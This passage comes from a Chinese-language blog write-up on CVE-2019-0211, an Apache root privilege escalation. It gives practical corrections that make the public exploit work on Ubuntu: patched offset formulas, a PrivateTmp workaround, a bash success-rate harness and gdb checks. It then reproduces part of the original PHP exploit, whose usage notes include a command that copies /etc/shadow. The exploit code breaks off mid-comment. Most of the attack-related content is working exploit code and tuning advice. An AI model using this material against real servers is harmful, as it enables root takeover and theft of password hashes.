class="cs8926E06">all_buckets</span><span class="cs9C1B1871">的起始位置，并复用了</span><span class="cs8926E06"> </span><span class="cs9C1B1871">在</span><span class="cs8926E06">scoreboard</span><span class="cs9C1B1871">中空闲的</span><span class="cs8926E06">servers</span><span class="cs9C1B1871">结构保存生成的</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">。最后利用在</span><span class="cs8926E06">2</span><span class="cs9C1B1871">步中获取的</span><span class="cs8926E06">worker</span><span class="cs9C1B1871">进程</span><span class="cs8926E06">id</span><span class="cs9C1B1871">找到所有的</span><span class="cs8926E06">process_score</span><span class="cs9C1B1871">，将其中的</span><span class="cs8926E06">bucket</span><span class="cs9C1B1871">修改成指定可利用的值。</span></p><h3 class="cs868C439D">
			<a name="补充"><span class="csD6CA00D2">补充</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">关于需要开始</span><span class="cs8926E06">ssl</span><span class="cs9C1B1871">模块说明：</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">就算不开</span><span class="cs8926E06">ssl</span><span class="cs9C1B1871">模块，漏洞也是存在的</span></li><li class="cs63189908"><span class="cs9C1B1871">就算不开启</span><span class="cs8926E06">ssl</span><span class="cs9C1B1871">模块，你自己修改</span><span class="cs8926E06">apache</span><span class="cs9C1B1871">配置，能开启其他端口，也是能利用的</span></li><li class="cs63189908"><span class="cs9C1B1871">如果只开了</span><span class="cs8926E06">80</span><span class="cs9C1B1871">端口，则需要另行找一条利用链，</span><span class="cs8926E06">github</span><span class="cs9C1B1871">上公布</span><span class="cs8926E06">exp</span><span class="cs9C1B1871">在只开启了一个端口的情况下是无效的</span></li><li class="cs63189908"><span class="cs8926E06">@cfreal</span><span class="cs9C1B1871">的文章中已经说了，我这里在多说句，相关代码可以看看</span><span class="cs8926E06"><a class="cs508254C" href="https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L433"><span class="cs4B51D5E4">1</span></a></span><span class="cs9C1B1871">和</span><span class="cs8926E06"><a class="cs508254C" href="https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L1223"><span class="cs4B51D5E4">2</span></a></span><span class="cs9C1B1871">还有</span><span class="cs9FB05234">SAFE_ACCPET</span><span class="cs9C1B1871">的宏定义：</span></li></ol>
		<p class="cs3A447A38"><span class="cs9FB05234">&lt;span class=&quot;cm&quot;&gt;/* On some architectures it&#39;s safe to do unserialized accept()s in the single&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;cm&quot;&gt; * Listen case. &nbsp;But it&#39;s never safe to do it in the case where there&#39;s&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;cm&quot;&gt; * multiple Listen statements. &nbsp;Define SINGLE_LISTEN_UNSERIALIZED_ACCEPT&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;cm&quot;&gt; * when it&#39;s safe in the single Listen case.&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;cm&quot;&gt; */&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;cp&quot;&gt;#ifdef SINGLE_LISTEN_UNSERIALIZED_ACCEPT&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;cp&quot;&gt;#define SAFE_ACCEPT(stmt) (ap_listeners-&amp;gt;next ? (stmt) : APR_SUCCESS)&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;cp&quot;&gt;#else&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;cp&quot;&gt;#define SAFE_ACCEPT(stmt) (stmt)&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;cp&quot;&gt;#endif&lt;/span&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">简单的来说，只有在</span><span class="cs8926E06">apache</span><span class="cs9C1B1871">开启多个端口的情况下，才会生成</span><span class="cs8926E06">mutex</span><span class="cs9C1B1871">互斥锁，而在</span><span class="cs8926E06">github</span><span class="cs9C1B1871">上公布的</span><span class="cs8926E06">exp</span><span class="cs9C1B1871">就是通过</span><span class="cs8926E06">apache</span><span class="cs9C1B1871">的</span><span class="cs8926E06">mutex</span><span class="cs9C1B1871">对象来进行利用的。</span></p><h3 class="cs868C439D">
			<a name="跑exp中遇到的一些坑"><span class="csD6CA00D2">跑</span><span class="csD1E291E2">exp</span><span class="csD6CA00D2">中遇到的一些坑</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">我试过了很多版本，没有一个版本是能直接使用</span><span class="cs8926E06">Github</span><span class="cs9C1B1871">上的</span><span class="cs8926E06">exp</span><span class="cs9C1B1871">的，在上述表面的版本中，经过调试研究发现了两个问题导致了利用失败：</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9FB05234">$all_buckets = $i - 0x10</span><span class="cs8926E06"> </span><span class="cs9C1B1871">计算出问题</span></li><li class="cs63189908"><span class="cs9FB05234">$bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2);</span><span class="cs8926E06"> </span><span class="cs9C1B1871">计算出问题</span></li></ol>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">第一个计算</span><span class="cs9FB05234">all_buckets</span><span class="cs9C1B1871">的地址，使用</span><span class="cs8926E06">gdb</span><span class="cs9C1B1871">进行调试，你会发现，这个值并没有算错，但是在执行</span><span class="cs9FB05234">apache2ctl graceful</span><span class="cs9C1B1871">命令以后，</span><span class="cs9FB05234">all_buckets</span><span class="cs8926E06"> </span><span class="cs9C1B1871">生成了一个新的值，不过只和之前的</span><span class="cs9FB05234">all_buckets</span><span class="cs9C1B1871">地址差</span><span class="cs9FB05234">0x38000</span><span class="cs9C1B1871">，所以这个问题很好解决：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;span class=&quot;x&quot;&gt;$all_buckets = $i - 0x10 + 0x38000;&lt;/span&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第二个计算没必要这么复杂，而且在我测试的版本中还是算的错误的地址，直接改成：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;span class=&quot;x&quot;&gt;$bucket_index = $bucket_index_middle;&lt;/span&gt;</span></p><h3 class="cs868C439D">
			<a name="ubuntu中的一个坑"><span class="csD1E291E2">ubuntu</span><span class="csD6CA00D2">中的一个坑</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">我的</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">是：</span><span class="cs9FB05234">curl &quot;http://www.0-sec.org/cfreal-carpediem.php?cmd=id&gt;/tmp/2323232&quot;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">表面上看是执行成功了，但是却并没有在</span><span class="cs8926E06">/tmp</span><span class="cs9C1B1871">目录下发现</span><span class="cs8926E06">2323232</span><span class="cs9C1B1871">文件，经过随后的研究发现，</span><span class="cs8926E06">systemd</span><span class="cs9C1B1871">重定向了</span><span class="cs8926E06">apache</span><span class="cs9C1B1871">的</span><span class="cs8926E06">tmp</span><span class="cs9C1B1871">目录，执行下</span><span class="cs9FB05234">$find /tmp -name &quot;2323232&quot;</span><span class="cs9C1B1871">就找到文件了，不过只有</span><span class="cs8926E06">root</span><span class="cs9C1B1871">用户能访问。如果不想让</span><span class="cs8926E06">systemd</span><span class="cs9C1B1871">重定向</span><span class="cs8926E06">tmp</span><span class="cs9C1B1871">目录也简单：</span></p><p class="cs3A447A38"><span class="cs9FB05234">$ cat /lib/systemd/system/apache2.service </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Unit&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;nv&quot;&gt;Description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;The Apache HTTP Server</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;nv&quot;&gt;After&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;network.target remote-fs.target nss-lookup.target</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Service&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;nv&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;forking</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;nv&quot;&gt;Environment&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;APACHE_STARTED_BY_SYSTEMD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;nv&quot;&gt;ExecStart&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/sbin/apachectl start</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;nv&quot;&gt;ExecStop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/sbin/apachectl stop</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;nv&quot;&gt;ExecReload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/sbin/apachectl graceful</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;nv&quot;&gt;PrivateTmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;nv&quot;&gt;Restart&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on-abort</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Install&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;nv&quot;&gt;WantedBy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;multi-user.target</span></p><h3 class="cs868C439D">
			<a name="关于成功率的说法"><span class="csD6CA00D2">关于成功率的说法</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">exp</span><span class="cs9C1B1871">的注释中看到了说该利用没法</span><span class="cs8926E06">100%</span><span class="cs9C1B1871">成功，有失败的概率，所以我写了个脚本进行测试：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;span class=&quot;c1&quot;&gt;#!/bin/bash&lt;/span&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&lt;span class=&quot;nv&quot;&gt;SUCC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;nv&quot;&gt;COUNT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; i in &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;seq &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;nb&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;COUNT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/etc/init.d/apache2 stop</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sleep &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/etc/init.d/apache2 start</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; -f &lt;span class=&quot;s2&quot;&gt;&quot;/tmp/1982347&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rm /tmp/1982347</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">curl &lt;span class=&quot;s2&quot;&gt;&quot;http://localhost/cfreal-carpediem.php?cmd=id&amp;gt;/tmp/1982347&quot;&lt;/span&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">apache2ctl graceful</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">sleep &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; -f &lt;span class=&quot;s2&quot;&gt;&quot;/tmp/1982347&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;span class=&quot;nb&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;SUCC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;COUNT: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$COUNT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SUCCESS: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SUCC&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;</span></p><h3 class="cs868C439D">
			<a name="总结"><span class="csD6CA00D2">总结</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">其他版本的还没有进行测试，但是在这里给一些建议。</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs8926E06">check all_buckets</span><span class="cs9C1B1871">地址</span></li></ol>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">这个挺简单的，执行完</span><span class="cs8926E06">exp</span><span class="cs9C1B1871">以后，有输出对应的</span><span class="cs8926E06">pid</span><span class="cs9C1B1871">和</span><span class="cs8926E06">all_buckets</span><span class="cs9C1B1871">地址，可以使用</span><span class="cs8926E06">gdb attach</span><span class="cs9C1B1871">上去检查下该地址是否正确：</span><span class="cs9FB05234">p all_buckets</span></li><li class="cs24C36B3"><span class="cs8926E06">PS</span><span class="cs9C1B1871">：这里要注意下，需要安装</span><span class="cs8926E06">dbg</span><span class="cs9C1B1871">包，才有</span><span class="cs8926E06">all_buckets</span><span class="cs9C1B1871">符号</span><span class="cs8926E06"> </span><span class="cs9C1B1871">：</span><span class="cs9FB05234">apt install apache2-dbg=2.4.29-1ubuntu4</span></li><li class="cs24C36B3"><span class="cs9C1B1871">如果有问题，就调试检查</span><span class="cs8926E06">exp</span><span class="cs9C1B1871">中搜索</span><span class="cs8926E06">all_buckets</span><span class="cs9C1B1871">地址的流程</span></li><li class="cs24C36B3"><span class="cs9C1B1871">如果没问题，就使用</span><span class="cs8926E06">gdb attach</span><span class="cs9C1B1871">主进程</span><span class="cs8926E06">(root</span><span class="cs9C1B1871">权限的那个进程</span><span class="cs8926E06">)</span><span class="cs9C1B1871">，然后断点下在</span><span class="cs9FB05234">make_child</span><span class="cs9C1B1871">，然后执行</span><span class="cs9FB05234">apache2ctl graceful</span><span class="cs9C1B1871">，执行完然后在</span><span class="cs8926E06">gdb</span><span class="cs9C1B1871">的流程跳到</span><span class="cs8926E06">make_child</span><span class="cs9C1B1871">函数的时候，再输出一次：</span><span class="cs9FB05234">p all_buckets</span><span class="cs9C1B1871">，和</span><span class="cs8926E06">exp</span><span class="cs9C1B1871">获取的值对比一下，如果一样就没问题了</span></li></ul>
		<ol start="2" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs8926E06">check my_bucket</span><span class="cs9C1B1871">地址</span></li></ol>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">前面的流程和上面一样，重点关注在</span><span class="cs8926E06">make_child</span><span class="cs9C1B1871">函数中的</span><span class="cs8926E06">my_bucket</span><span class="cs9C1B1871">赋值的代码：</span><span class="cs8926E06"><a class="cs508254C" href="https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L691"><span class="cs4B51D5E4">3</span></a></span></li><li class="cs24C36B3"><span class="cs9C1B1871">这里注意下，因为上面有一个</span><span class="cs8926E06">fork</span><span class="cs9C1B1871">，所以在</span><span class="cs8926E06">gdb</span><span class="cs9C1B1871">里还要加一句：</span><span class="cs9FB05234">set follow-fork-mode child</span></li><li class="cs24C36B3"><span class="cs9FB05234">my_bucket</span><span class="cs9C1B1871">的值是一个指针，指向堆喷的地址，如果</span><span class="cs9FB05234">my_bucket</span><span class="cs9C1B1871">的值没问题，</span><span class="cs8926E06">exp</span><span class="cs9C1B1871">基本就没问题了，如果不对，就调整</span><span class="cs9FB05234">$bucket_index</span></li></ul>
		<h3 class="cs868C439D">
			<a name="poc-2"><span class="csD1E291E2">poc 2</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># CARPE (DIEM): CVE-2019-0211 Apache Root Privilege Escalation</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Charles Fol</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># @cfreal_</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># 2019-04-08</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># INFOS</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># USAGE</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># 1. Upload exploit to Apache HTTP server</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># 2. Send request to page</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># 3. Await 6:25AM for logrotate to restart Apache</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># 4. python3.5 is now suid 0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># You can change the command that is ran as root using the cmd HTTP</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># parameter (GET/POST).</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Example: curl http://localhost/carpediem.php?cmd=cp+/etc/shadow+/tmp/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># SUCCESS RATE</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Number of successful and failed exploitations relative to of the number</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># of MPM workers (i.e. Apache subprocesses). YMMV.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># W &nbsp;--% S &nbsp;&nbsp;F</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;5 87% 177 26 (default)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;8 89% &nbsp;60 &nbsp;8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># 10 95% &nbsp;70 &nbsp;4</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># More workers, higher success rate.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># By default (5 workers), 87% success rate. With huge HTTPds, close to 100%.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Generally, failure is due to all_buckets being relocated too far from its</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># original address.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># TESTED ON</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># - Apache/2.4.25</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># - PHP 7.2.12</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># - Debian GNU/Linux 9.6</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># TESTING</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># $ curl http://localhost/cfreal-carpediem.php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># $ sudo /usr/sbin/logrotate /etc/logrotate.conf --force</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># $ ls -alh /usr/bin/python3.5</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># -rwsr-sr-x 2 root root 4.6M Sep 27 &nbsp;2018 /usr/bin/python3.5</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># There are no hardcoded addresses.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># - Addresses read through /proc/self/mem</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># - Offsets read through ELF parsing</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># As usual, there are tons of comments.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">o(&#39;CARPE (DIEM) ~ CVE-2019-0211&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">o(&#39;&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">error_reporting(E_ALL);</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"># Starts the exploit by triggering the UAF.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function real()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;global $y;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$y = [new Z()];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;json_encode([0 =&gt; &amp;$y]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># In order to read/write what comes after in memory, we need to UAF a string so</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># that we can control its size and make in-place edition.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># An easy way to do that is to replace the string by a timelib_rel_time</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># structure of which the first bytes can be reached by the (y, m, d, h, i, s)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># properties of the DateInterval object.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Steps:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># - Create a base object (Z)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># - Add string property (abc) so that sizeof(abc) = sizeof(timelib_rel_time)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># - Create DateInterval object ($place) meant to be unset and filled by another</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># - Trigger the UAF by unsetting $y[0], which is still reachable using $this</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># - Unset $place: at this point, if we create a new DateInterval object, it will</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;replace $place in memory</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># - Create a string ($holder) that fills $place&#39;s timelib_rel_time structure</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># - Allocate a new DateInterval object: its timelib_rel_time structure will</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;end up in place of abc</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># - Now we can control $this-&gt;abc&#39;s zend_string structure entirely using</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;y, m, d etc.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># - Increase abc&#39;s size so that we can read/write memory that comes after it,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;especially the shared memory block</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># - Find out all_buckets&#39; position by finding a memory region that matches the</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;mutex-&gt;meth structure</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># - Compute the bucket index required to reach the SHM and get an arbitrary</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;function call</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># - Scan ap_scoreboard_image-&gt;parent[] to find workers&#39; PID and replace the</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;bucket</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">class Z implements JsonSerializable</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public function jsonSerialize()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;global $y, $addresses, $workers_pids;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Setup memory</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39;Triggering UAF&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39; &nbsp;Creating room and filling empty spaces&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Fill empty blocks to make sure our allocations will be contiguous</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# I: Since a lot of allocations/deallocations happen before the script</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# is ran, two variables instanciated at the same time might not be</span><span 